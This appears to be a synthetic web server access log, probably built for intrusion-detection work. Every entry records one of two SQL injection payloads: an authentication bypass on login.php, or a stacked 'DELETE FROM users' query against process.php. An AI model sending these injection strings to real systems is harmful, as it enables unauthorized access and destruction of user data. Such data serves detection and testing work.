87.240.198.228,2023-03-19 19:51:41,GET /login.php?user=admin';--,302
117.252.74.110,2023-01-30 09:22:15,POST /process.php?id=1; DELETE FROM users;--,302
171.212.195.159,2023-01-28 05:24:50,POST /process.php?id=1; DELETE FROM users;--,302
63.166.103.50,2023-05-27 11:46:39,GET /login.php?user=admin';--,200
88.45.246.102,2023-05-03 06:28:33,POST /process.php?id=1; DELETE FROM users;--,200
216.37.126.106,2023-04-27 16:24:42,GET /login.php?user=admin';--,200
215.218.182.182,2023-04-07 06:02:38,POST /process.php?id=1; DELETE FROM users;--,200
69.207.234.104,2023-06-20 19:07:27,POST /process.php?id=1; DELETE FROM users;--,200
146.239.96.73,2023-10-14 19:57:33,POST /process.php?id=1; DELETE FROM users;--,200
129.202.179.150,2023-01-14 07:23:48,GET /login.php?user=admin';--,302
163.81.46.37,2023-01-09 01:25:14,GET /login.php?user=admin';--,200
150.70.38.241,2023-04-12 18:57:01,GET /login.php?user=admin';--,404
6.144.40.92,2023-06-25 18:16:04,GET /login.php?user=admin';--,302
124.230.156.122,2023-11-10 12:08:43,GET /login.php?user=admin';--,200
53.54.229.100,2023-11-29 18:26:20,POST /process.php?id=1; DELETE FROM users;--,404
158.172.45.6,2023-03-19 17:55:43,GET /login.php?user=admin';--,302
172.83.145.249,2023-03-22 11:43:17,POST /process.php?id=1; DELETE FROM users;--,302
68.73.134.155,2023-06-12 02:02:51,POST /process.php?id=1; DELETE FROM users;--,404
205.22.160.2,2023-02-23 08:07:20,GET /login.php?user=admin';--,302
20.108.26.102,2023-07-14 10:11:19,GET /login.php?user=admin';--,200
59.232.229.214,2023-04-28 08:42:39,POST /process.php?id=1; DELETE FROM users;--,302
70.247.43.136,2023-04-25 12:01:48,POST /process.php?id=1; DELETE FROM users;--,404
187.106.144.38,2023-04-23 14:13:13,GET /login.php?user=admin';--,200
217.173.246.220,2023-03-19 03:46:35,POST /process.php?id=1; DELETE FROM users;--,200
99.18.75.125,2023-07-17 03:26:17,GET /login.php?user=admin';--,200
186.177.213.67,2023-05-25 03:14:56,POST /process.php?id=1; DELETE FROM users;--,302
191.94.51.27,2023-08-22 01:11:03,POST /process.php?id=1; DELETE FROM users;--,302
48.251.8.52,2023-02-04 17:03:48,POST /process.php?id=1; DELETE FROM users;--,302
158.193.69.176,2023-06-19 12:29:43,GET /login.php?user=admin';--,302
36.205.155.144,2023-02-07 03:50:09,POST /process.php?id=1; DELETE FROM users;--,404
71.209.86.155,2023-09-24 16:48:15,POST /process.php?id=1; DELETE FROM users;--,302
120.220.223.170,2023-10-11 09:40:52,POST /process.php?id=1; DELETE FROM users;--,302
5.81.140.127,2023-05-07 02:21:25,GET /login.php?user=admin';--,200
185.33.129.233,2023-08-23 07:06:23,POST /process.php?id=1; DELETE FROM users;--,302
201.8.12.233,2023-03-24 11:19:56,GET /login.php?user=admin';--,200
196.28.100.237,2023-08-11 19:21:40,POST /process.php?id=1; DELETE FROM users;--,302
1.184.34.138,2023-10-04 10:18:18,GET /login.php?user=admin';--,404
196.49.225.11,2023-05-12 05:09:56,GET /login.php?user=admin';--,302
88.165.245.132,2023-05-16 02:51:46,POST /process.php?id=1; DELETE FROM users;--,200
7.62.210.133,2023-08-13 08:17:04,GET /login.php?user=admin';--,302
151.37.9.215,2023-04-25 22:15:06,GET /login.php?user=admin';--,302
89.8.222.177,2023-03-22 04:01:29,POST /process.php?id=1; DELETE FROM users;--,302
158.131.237.125,2023-09-26 07:55:42,GET /login.php?user=admin';--,200
91.15.212.142,2023-10-03 20:50:23,POST /process.php?id=1; DELETE FROM users;--,200
131.249.46.85,2023-05-04 17:25:23,GET /login.php?user=admin';--,404
34.167.111.70,2023-06-16 04:19:33,POST /process.php?id=1; DELETE FROM users;--,200
98.137.198.208,2023-07-20 16:22:02,POST /process.php?id=1; DELETE FROM users;--,302
162.232.241.141,2023-03-25 21:17:29,GET /login.php?user=admin';--,200
70.160.173.191,2023-02-18 12:27:17,POST /process.php?id=1; DELETE FROM users;--,200
205.172.235.241,2023-08-06 22:44:11,GET /login.php?user=admin';--,404
152.140.146.52,2023-01-15 02:59:03,POST /process.php?id=1; DELETE FROM users;--,302
216.25.144.155,2023-03-05 02:09:35,GET /login.php?user=admin';--,200
123.254.193.175,2023-11-10 17:20:34,GET /login.php?user=admin';--,200
67.98.108.142,2023-06-23 19:36:16,POST /process.php?id=1; DELETE FROM users;--,200
213.206.223.205,2023-08-14 22:46:58,POST /process.php?id=1; DELETE FROM users;--,302
23.170.83.165,2023-03-19 10:55:59,POST /process.php?id=1; DELETE FROM users;--,200
94.208.192.42,2023-01-12 12:14:36,GET /login.php?user=admin';--,302
137.195.44.228,2023-06-09 19:33:55,POST /process.php?id=1; DELETE FROM users;--,302
2.158.130.240,2023-04-03 07:09:20,POST /process.php?id=1; DELETE FROM users;--,302
34.97.178.203,2023-08-04 20:08:06,POST /process.php?id=1; DELETE FROM users;--,302
75.96.202.172,2023-10-23 00:11:02,GET /login.php?user=admin';--,200
67.88.168.167,2023-11-01 09:24:46,POST /process.php?id=1; DELETE FROM users;--,404
130.205.88.168,2023-05-04 18:56:49,GET /login.php?user=admin';--,200
112.169.226.114,2023-06-05 05:39:59,POST /process.php?id=1; DELETE FROM users;--,200
176.117.120.85,2023-06-18 07:23:47,POST /process.php?id=1; DELETE FROM users;--,200
134.121.49.132,2023-05-27 09:34:26,GET /login.php?user=admin';--,200
41.167.195.49,2023-01-15 11:58:17,POST /process.php?id=1; DELETE FROM users;--,302
13.55.19.90,2023-10-14 20:37:40,GET /login.php?user=admin';--,302
19.90.120.138,2023-09-12 09:52:10,POST /process.php?id=1; DELETE FROM users;--,302
206.216.147.86,2023-05-21 14:25:17,POST /process.php?id=1; DELETE FROM users;--,200
122.121.227.119,2023-10-23 09:42:49,POST /process.php?id=1; DELETE FROM users;--,200
145.159.26.44,2023-11-06 09:22:23,POST /process.php?id=1; DELETE FROM users;--,200
36.83.39.77,2023-06-23 17:07:04,POST /process.php?id=1; DELETE FROM users;--,404
214.44.164.205,2023-08-31 14:00:37,GET /login.php?user=admin';--,200
157.105.249.9,2023-11-16 08:50:39,POST /process.php?id=1; DELETE FROM users;--,200
11.140.33.159,2023-07-11 13:48:37,GET /login.php?user=admin';--,404
53.120.234.135,2023-01-25 12:10:01,GET /login.php?user=admin';--,302
196.62.39.231,2023-01-13 02:20:25,GET /login.php?user=admin';--,200
190.167.17.216,2023-02-02 05:53:07,GET /login.php?user=admin';--,302
158.129.179.150,2023-01-07 00:58:05,GET /login.php?user=admin';--,404
25.48.129.93,2023-02-13 19:49:41,POST /process.php?id=1; DELETE FROM users;--,200
87.255.35.100,2023-04-12 11:08:30,POST /process.php?id=1; DELETE FROM users;--,404
111.222.36.30,2023-03-22 01:50:39,GET /login.php?user=admin';--,404
27.212.227.16,2023-05-30 04:15:27,GET /login.php?user=admin';--,404
175.147.172.145,2023-04-06 11:05:34,GET /login.php?user=admin';--,302
20.80.34.17,2023-03-10 23:01:53,POST /process.php?id=1; DELETE FROM users;--,404
160.134.21.121,2023-02-01 02:54:01,GET /login.php?user=admin';--,404
128.62.148.162,2023-10-12 05:28:10,GET /login.php?user=admin';--,302
122.28.70.91,2023-10-25 23:01:23,GET /login.php?user=admin';--,404
144.235.200.104,2023-03-07 06:26:56,GET /login.php?user=admin';--,404
177.213.186.217,2023-08-10 03:06:24,GET /login.php?user=admin';--,302
3.131.205.194,2023-09-17 02:03:07,POST /process.php?id=1; DELETE FROM users;--,200
103.95.58.8,2023-07-07 20:29:35,GET /login.php?user=admin';--,302
56.92.63.61,2023-01-28 11:35:10,POST /process.php?id=1; DELETE FROM users;--,302
102.122.194.87,2023-05-09 21:54:19,GET /login.php?user=admin';--,302
29.208.99.246,2023-09-22 01:46:27,POST /process.php?id=1; DELETE FROM users;--,302
219.230.193.31,2023-07-29 06:03:36,GET /login.php?user=admin';--,404
67.134.48.234,2023-07-21 03:04:44,POST /process.php?id=1; DELETE FROM users;--,200
82.101.170.146,2023-07-22 07:06:33,GET /login.php?user=admin';--,404
181.162.235.195,2023-05-11 02:36:40,GET /login.php?user=admin';--,302
105.123.144.166,2023-11-14 22:51:27,GET /login.php?user=admin';--,302
3.66.44.139,2023-06-24 03:35:03,POST /process.php?id=1; DELETE FROM users;--,404
94.252.187.22,2023-06-03 00:54:38,POST /process.php?id=1; DELETE FROM users;--,200
188.10.15.173,2023-04-15 00:11:57,POST /process.php?id=1; DELETE FROM users;--,302
81.172.245.228,2023-11-24 20:00:53,POST /process.php?id=1; DELETE FROM users;--,200
79.161.143.188,2023-02-02 06:47:37,GET /login.php?user=admin';--,302
203.136.182.61,2023-01-13 03:39:37,GET /login.php?user=admin';--,404
184.132.84.238,2023-03-25 00:21:44,POST /process.php?id=1; DELETE FROM users;--,404
68.40.224.0,2023-05-24 01:08:43,GET /login.php?user=admin';--,404
210.67.248.164,2023-01-20 19:29:27,GET /login.php?user=admin';--,404
197.209.252.123,2023-01-26 01:22:10,GET /login.php?user=admin';--,302
152.110.83.242,2023-03-22 11:06:55,GET /login.php?user=admin';--,302
124.245.56.188,2023-06-24 15:59:37,POST /process.php?id=1; DELETE FROM users;--,404
152.204.37.165,2023-03-24 04:48:39,GET /login.php?user=admin';--,200
128.94.39.16,2023-10-11 16:56:10,POST /process.php?id=1; DELETE FROM users;--,200
177.214.202.190,2023-03-28 13:19:48,GET /login.php?user=admin';--,200
198.198.53.227,2023-07-07 09:07:51,GET /login.php?user=admin';--,404
136.144.21.216,2023-06-23 11:57:34,GET /login.php?user=admin';--,404
181.138.137.28,2023-02-10 10:01:38,POST /process.php?id=1; DELETE FROM users;--,302
60.64.131.165,2023-04-01 20:39:16,POST /process.php?id=1; DELETE FROM users;--,302
37.86.201.109,2023-08-05 23:04:28,POST /process.php?id=1; DELETE FROM users;--,404
198.136.36.62,2023-02-14 14:19:14,POST /process.php?id=1; DELETE FROM users;--,404
31.225.120.180,2023-10-16 03:39:09,GET /login.php?user=admin';--,404
69.131.240.192,2023-05-27 04:42:01,GET /login.php?user=admin';--,200
40.15.87.139,2023-11-11 16:47:30,POST /process.php?id=1; DELETE FROM users;--,302
75.178.156.248,2023-08-21 22:38:42,GET /login.php?user=admin';--,200
187.176.23.69,2023-03-07 19:32:26,GET /login.php?user=admin';--,302
40.140.251.251,2023-05-08 00:04:52,GET /login.php?user=admin';--,404
217.109.54.13,2023-03-29 08:35:08,GET /login.php?user=admin';--,200
75.213.76.127,2023-03-11 03:16:49,POST /process.php?id=1; DELETE FROM users;--,200
181.14.165.165,2023-01-01 01:48:07,POST /process.php?id=1; DELETE FROM users;--,404
148.66.121.78,2023-07-12 20:57:24,GET /login.php?user=admin';--,404
181.230.6.92,2023-05-30 20:45:12,POST /process.php?id=1; DELETE FROM users;--,200
28.119.0.103,2023-09-10 18:50:24,GET /login.php?user=admin';--,200
186.108.211.179,2023-03-19 00:55:35,POST /process.php?id=1; DELETE FROM users;--,302
59.152.100.231,2023-02-24 13:16:09,GET /login.php?user=admin';--,302
160.84.81.228,2023-07-28 05:50:03,GET /login.php?user=admin';--,404
15.15.222.4,2023-01-04 14:33:13,GET /login.php?user=admin';--,404
84.78.167.78,2023-04-04 13:23:01,GET /login.php?user=admin';--,200
99.96.98.134,2023-05-03 14:51:22,GET /login.php?user=admin';--,302
67.194.181.57,2023-05-29 23:43:51,POST /process.php?id=1; DELETE FROM users;--,302
212.160.30.56,2023-07-29 18:21:17,POST /process.php?id=1; DELETE FROM users;--,302
72.235.182.32,2023-01-18 04:34:21,POST /process.php?id=1; DELETE FROM users;--,200
114.176.235.28,2023-06-18 02:31:33,GET /login.php?user=admin';--,404
153.176.196.193,2023-04-11 03:42:09,POST /process.php?id=1; DELETE FROM users;--,200
121.220.214.133,2023-09-27 15:43:03,POST /process.php?id=1; DELETE FROM users;--,404
10.242.77.217,2023-11-20 06:36:30,POST /process.php?id=1; DELETE FROM users;--,200
130.73.225.39,2023-01-14 08:56:41,POST /process.php?id=1; DELETE FROM users;--,200
138.229.78.159,2023-06-21 23:36:11,GET /login.php?user=admin';--,200
21.155.156.60,2023-02-24 01:47:32,GET /login.php?user=admin';--,200
164.64.157.24,2023-04-04 05:22:23,GET /login.php?user=admin';--,302
24.147.186.34,2023-01-21 17:50:59,POST /process.php?id=1; DELETE FROM users;--,200
71.219.12.81,2023-03-12 09:15:53,POST /process.php?id=1; DELETE FROM users;--,404
214.209.225.221,2023-04-10 15:48:32,GET /login.php?user=admin';--,200
215.50.213.151,2023-08-09 15:04:20,POST /process.php?id=1; DELETE FROM users;--,302
5.83.58.36,2023-05-06 00:01:13,GET /login.php?user=admin';--,200
65.108.189.97,2023-05-12 17:23:19,GET /login.php?user=admin';--,404
42.45.70.203,2023-09-13 13:23:13,GET /login.php?user=admin';--,200
24.206.150.118,2023-06-01 22:53:08,GET /login.php?user=admin';--,404
105.220.8.179,2023-07-19 08:39:09,POST /process.php?id=1; DELETE FROM users;--,302
45.129.136.156,2023-07-13 03:28:30,POST /process.php?id=1; DELETE FROM users;--,302
149.177.206.53,2023-07-18 05:24:58,GET /login.php?user=admin';--,404
69.166.215.76,2023-11-24 14:34:31,GET /login.php?user=admin';--,404
178.180.119.1,2023-07-26 23:09:29,GET /login.php?user=admin';--,302
212.215.174.158,2023-09-11 13:09:34,POST /process.php?id=1; DELETE FROM users;--,200
142.199.194.255,2023-02-23 05:18:44,GET /login.php?user=admin';--,302
107.151.83.87,2023-05-16 17:47:13,POST /process.php?id=1; DELETE FROM users;--,200
195.159.9.17,2023-02-23 14:11:30,GET /login.php?user=admin';--,404
131.9.25.169,2023-10-12 22:44:06,GET /login.php?user=admin';--,302
98.72.99.115,2023-06-27 18:47:49,POST /process.php?id=1; DELETE FROM users;--,200
89.173.211.20,2023-07-07 02:23:13,GET /login.php?user=admin';--,404
139.241.79.248,2023-08-19 10:29:58,POST /process.php?id=1; DELETE FROM users;--,302
87.117.130.216,2023-08-01 16:32:40,GET /login.php?user=admin';--,404
159.88.208.241,2023-06-28 04:00:27,POST /process.php?id=1; DELETE FROM users;--,404
89.122.233.173,2023-04-18 11:26:16,GET /login.php?user=admin';--,302
72.44.253.29,2023-11-07 08:05:01,GET /login.php?user=admin';--,302
167.179.120.100,2023-08-02 15:14:09,POST /process.php?id=1; DELETE FROM users;--,302
148.229.115.5,2023-05-14 06:07:25,GET /login.php?user=admin';--,404
43.242.48.248,2023-07-23 22:30:39,POST /process.php?id=1; DELETE FROM users;--,404
52.8.86.27,2023-09-29 14:51:24,GET /login.php?user=admin';--,302
137.131.204.127,2023-07-16 20:16:18,POST /process.php?id=1; DELETE FROM users;--,404
185.240.112.45,2023-02-22 21:12:46,POST /process.php?id=1; DELETE FROM users;--,404
29.254.125.159,2023-11-16 09:40:58,POST /process.php?id=1; DELETE FROM users;--,200
105.250.58.46,2023-08-24 16:17:11,GET /login.php?user=admin';--,200
51.52.237.59,2023-11-29 15:48:38,GET /login.php?user=admin';--,200
111.6.181.99,2023-10-08 05:16:22,GET /login.php?user=admin';--,302
103.59.147.135,2023-01-04 00:18:03,GET /login.php?user=admin';--,200
163.245.248.138,2023-09-25 20:19:26,GET /login.php?user=admin';--,404
141.222.165.246,2023-11-17 02:48:26,GET /login.php?user=admin';--,404
70.205.120.90,2023-10-06 11:00:37,POST /process.php?id=1; DELETE FROM users;--,404
31.249.51.193,2023-07-15 01:54:54,GET /login.php?user=admin';--,200
139.115.175.177,2023-09-12 03:53:48,GET /login.php?user=admin';--,404
211.96.22.252,2023-05-10 18:47:59,POST /process.php?id=1; DELETE FROM users;--,302
184.157.136.144,2023-01-11 18:15:34,GET /login.php?user=admin';--,404
213.147.44.139,2023-01-18 20:57:01,POST /process.php?id=1; DELETE FROM users;--,302
23.211.16.112,2023-03-31 00:49:02,GET /login.php?user=admin';--,200
32.70.254.132,2023-10-20 12:38:17,GET /login.php?user=admin';--,302
12.109.188.198,2023-07-24 22:48:13,POST /process.php?id=1; DELETE FROM users;--,404
84.74.12.159,2023-07-16 11:43:39,POST /process.php?id=1; DELETE FROM users;--,302
80.210.94.158,2023-02-05 14:00:40,GET /login.php?user=admin';--,302
222.143.191.144,2023-07-05 06:25:55,GET /login.php?user=admin';--,302
38.155.24.212,2023-08-03 12:37:05,GET /login.php?user=admin';--,200
201.22.154.5,2023-04-30 07:22:41,GET /login.php?user=admin';--,200
157.223.241.85,2023-02-25 00:50:55,GET /login.php?user=admin';--,302
54.200.123.152,2023-09-21 10:03:29,POST /process.php?id=1; DELETE FROM users;--,302
53.240.62.164,2023-03-31 00:06:35,POST /process.php?id=1; DELETE FROM users;--,200
106.13.70.148,2023-01-30 06:17:13,GET /login.php?user=admin';--,404
176.7.70.174,2023-06-17 23:34:31,GET /login.php?user=admin';--,302
32.102.141.89,2023-06-19 04:36:04,POST /process.php?id=1; DELETE FROM users;--,404
13.211.166.68,2023-09-18 16:26:17,POST /process.php?id=1; DELETE FROM users;--,404
140.74.22.119,2023-11-28 20:30:34,POST /process.php?id=1; DELETE FROM users;--,302
144.255.128.245,2023-04-27 17:49:46,GET /login.php?user=admin';--,404
85.152.125.68,2023-11-07 21:49:24,GET /login.php?user=admin';--,302
122.125.27.235,2023-10-18 13:40:44,POST /process.php?id=1; DELETE FROM users;--,302
67.239.168.158,2023-09-07 04:29:22,POST /process.php?id=1; DELETE FROM users;--,404
165.125.6.27,2023-05-24 21:58:02,GET /login.php?user=admin';--,404
50.195.206.21,2023-03-26 04:39:51,GET /login.php?user=admin';--,404
207.58.155.180,2023-01-08 04:32:45,POST /process.php?id=1; DELETE FROM users;--,200
51.229.51.21,2023-09-10 17:27:21,POST /process.php?id=1; DELETE FROM users;--,404
12.162.76.153,2023-07-23 03:28:53,POST /process.php?id=1; DELETE FROM users;--,404
204.226.251.24,2023-01-04 23:52:02,POST /process.php?id=1; DELETE FROM users;--,200
176.38.250.224,2023-10-20 07:57:19,GET /login.php?user=admin';--,404
219.220.52.6,2023-04-30 05:14:08,GET /login.php?user=admin';--,404
133.204.114.231,2023-06-10 19:24:53,POST /process.php?id=1; DELETE FROM users;--,302
135.69.59.66,2023-02-25 05:28:35,GET /login.php?user=admin';--,302
129.227.18.178,2023-07-28 11:35:14,GET /login.php?user=admin';--,302
5.233.89.141,2023-02-13 02:51:20,POST /process.php?id=1; DELETE FROM users;--,404
27.66.233.236,2023-01-10 22:21:19,POST /process.php?id=1; DELETE FROM users;--,302
136.181.181.12,2023-06-05 06:09:10,GET /login.php?user=admin';--,200
146.64.93.59,2023-04-03 13:47:34,GET /login.php?user=admin';--,404
12.231.119.242,2023-10-24 05:10:26,GET /login.php?user=admin';--,200
119.192.210.239,2023-08-30 18:42:15,GET /login.php?user=admin';--,302
8.5.60.87,2023-06-17 11:18:40,GET /login.php?user=admin';--,302
197.13.45.186,2023-04-07 03:48:22,POST /process.php?id=1; DELETE FROM users;--,302
197.136.142.101,2023-04-19 19:14:41,POST /process.php?id=1; DELETE FROM users;--,200
206.52.11.135,2023-03-21 05:59:10,POST /process.php?id=1; DELETE FROM users;--,200
46.89.49.3,2023-03-18 15:27:43,GET /login.php?user=admin';--,404
211.88.55.98,2023-06-29 05:28:46,GET /login.php?user=admin';--,302
94.232.44.48,2023-08-01 10:58:50,POST /process.php?id=1; DELETE FROM users;--,302
125.67.159.184,2023-02-13 04:07:40,POST /process.php?id=1; DELETE FROM users;--,200
17.141.159.185,2023-04-25 03:40:42,GET /login.php?user=admin';--,200
59.130.144.188,2023-07-18 06:02:27,POST /process.php?id=1; DELETE FROM users;--,200
173.255.203.108,2023-10-25 01:04:41,GET /login.php?user=admin';--,302
222.33.143.100,2023-10-01 08:01:41,GET /login.php?user=admin';--,404
200.60.210.5,2023-06-08 12:18:20,GET /login.php?user=admin';--,404
137.72.55.54,2023-10-11 00:05:41,POST /process.php?id=1; DELETE FROM users;--,404
56.221.164.231,2023-11-25 06:58:31,POST /process.php?id=1; DELETE FROM users;--,200
84.169.207.195,2023-11-28 11:16:23,GET /login.php?user=admin';--,404
141.72.14.211,2023-06-24 22:49:20,POST /process.php?id=1; DELETE FROM users;--,404
78.20.6.128,2023-08-12 00:33:46,POST /process.php?id=1; DELETE FROM users;--,404
45.44.218.101,2023-02-13 21:25:34,POST /process.php?id=1; DELETE FROM users;--,404
223.165.155.64,2023-10-16 03:14:43,GET /login.php?user=admin';--,404
142.254.83.181,2023-05-31 14:18:29,GET /login.php?user=admin';--,302
61.125.233.39,2023-02-05 21:42:58,POST /process.php?id=1; DELETE FROM users;--,200
62.125.173.41,2023-10-05 11:22:25,GET /login.php?user=admin';--,404
53.206.225.86,2023-01-04 04:10:32,POST /process.php?id=1; DELETE FROM users;--,200
87.198.134.204,2023-10-28 05:23:02,POST /process.php?id=1; DELETE FROM users;--,302
206.113.149.20,2023-03-21 14:53:14,POST /process.php?id=1; DELETE FROM users;--,404
24.144.24.225,2023-01-10 07:36:57,GET /login.php?user=admin';--,302
212.54.11.219,2023-09-08 04:44:52,GET /login.php?user=admin';--,302
85.69.61.50,2023-09-13 00:30:58,GET /login.php?user=admin';--,404
101.63.60.40,2023-01-19 09:48:17,POST /process.php?id=1; DELETE FROM users;--,302
223.79.138.76,2023-11-15 13:05:03,GET /login.php?user=admin';--,200
117.59.224.240,2023-08-28 09:54:39,GET /login.php?user=admin';--,404
63.145.168.3,2023-09-18 22:04:04,POST /process.php?id=1; DELETE FROM users;--,200
14.120.52.208,2023-05-18 20:17:07,POST /process.php?id=1; DELETE FROM users;--,200
154.222.24.225,2023-01-19 01:07:56,POST /process.php?id=1; DELETE FROM users;--,404
29.248.232.16,2023-11-14 08:58:27,GET /login.php?user=admin';--,200
